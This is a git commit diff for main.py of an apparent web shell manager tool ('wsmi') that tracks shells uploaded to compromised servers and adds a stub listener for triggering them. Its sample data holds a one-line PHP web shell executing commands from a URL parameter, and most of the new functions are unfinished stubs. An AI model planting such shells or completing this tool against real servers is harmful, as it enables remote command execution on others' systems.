f6aa5522595d443d5bd6f17326f990afa9bbdcaa
root <alexbires@gmail.com>
2013-11-07 21:05:40 -0500

    Added start of code to create a threaded network listener

--- main.py
+++ main.py
@@ -2,6 +2,34 @@ import sqlite3
 import signal
 import sys
 import urllib2
+import threading
+import socket
+import shells
+
+
+###next section is for threading combined with sockets
+class threading_network_listener(threading.Thread):
+	"""
+		This class represents the ability for the program to thread off and
+		set up a listener and makes an http request to trigger the candidate web shell
+		sitting on the compromised web server.
+	"""
+
+	def __init__(self, port = None):
+		self.port = None#the intended port for the thread to listen on
+		self.listen_sock = None#the actual socket listening on the port
+
+	def create_socket():
+		""" Creates a socket for the thread to listen on """
+		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
+		listen_socket.bind("", self.port)#listens on any interface's ip address
+		listen_socket.listen()#actually listen to a port
+		print "socket bound to port "+self.port
+		return listen_socket
+	
+	def run(self):
+		self.socket = create_socket()
+
 
 database_name = ""
 prompt = "wsmi>"
@@ -13,9 +41,14 @@ def print_banner():
 	print "     /_____\\      \\ \\    / /       |"
 
 def upload_shell():
+	"""
+		Handles the interaction to the user to handle all the details
+		of file uploading to the server.
+	"""
 	url = raw_input("url:")
 	page = raw_input("page:")
 	method = raw_input("http method:")
+	file_name = raw_input("filename:")
 
 def help():
 	print "Interactive help menu type  help <module> to get more information on a module\n"
@@ -38,9 +71,8 @@ def router(command):
 			prompt = "wsmi (shells/php)>"
 			directory = "shells/php"
 
-	
-
 def get_input():
+	""" gets the user's input and routes it accordingly"""
 	global prompt
 	userinput = raw_input(prompt)
 	if userinput[:3] == "use":
@@ -70,6 +102,8 @@ def initialize_database():
 	global database_name
 	database_name = name
 	cursor = conn.cursor()
+
+	#sample data for the time being
 	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text, language text)")
 	cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
 		[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
@@ -79,23 +113,49 @@ def show_shells():
 	"""
 		Shows the currently uploaded shells at specified urls
 	"""
-	conn = sqlite3.connect(database_name)
-	cursor = conn.cursor()
-	query = "select attackurl from vulnerable_sites"
-	cursor.execute(query)
-	rows = cursor.fetchall()
-	print "number\t\tattackurl"
-	print "------\t\t---------"
-	i=0
-	for row in rows:
-		print str(i)+'\t\t',row[0]
-		i+=1
+	try:
+		conn = sqlite3.connect(database_name)
+		cursor = conn.cursor()
+		query = "select attackurl from vulnerable_sites"
+		cursor.execute(query)
+		rows = cursor.fetchall()
+		print "number\t\tattackurl"
+		print "------\t\t---------"
+		i=0
+		for row in rows:
+			print str(i)+'\t\t',row[0]
+			i+=1
+	except sqlite3.OperationalError:
+		print "Need to have a database before you can view shells"
 
 def exit():
 	sys.exit(1)
 
-#a dictionary of functions that we can call based off
-#of a user's input
+def run_candidate_threads():
+	"""
+
+	"""
+	
+
+def check_candidacy():
+	"""
+		script that starts the process of checking a candidacy for a specific 
+		web server.
+
+		
+	"""
+	num_threads = raw_input("number of threads:")
+	timing = raw_input("timing level(0-5):")
+
+
+	
+
+def show_contents():
+	global directory
+	
+	print "showing contents"
+
+#a dictionary of functions that we can call based off of a user's input
 functions = {
 	"help":help,
 	"upload-shell":upload_shell,
@@ -103,17 +163,21 @@ functions = {
 	"view-shells":show_shells,
 	"exit":exit,
 	"quit":exit,
-	"back":traverse_up
+	"back":traverse_up,
+	"show":show_contents,
+	"check-candidacy":check_candidacy
 }
 
 def keyboardHandler(signal, frame):
+		"""Handles keyboard interrupts and exits gracefully"""
 		print ""
 		sys.exit(0)
 		#TODO: eventually write out to the database
 
 def main():
 	#handles keyboard interrupts gracefully
-	signal.signal(signal.SIGINT, keyboardHandler)	
+	signal.signal(signal.SIGINT, keyboardHandler)
+	a = threading_network_listener()
 
 	while 1:
 		get_input()
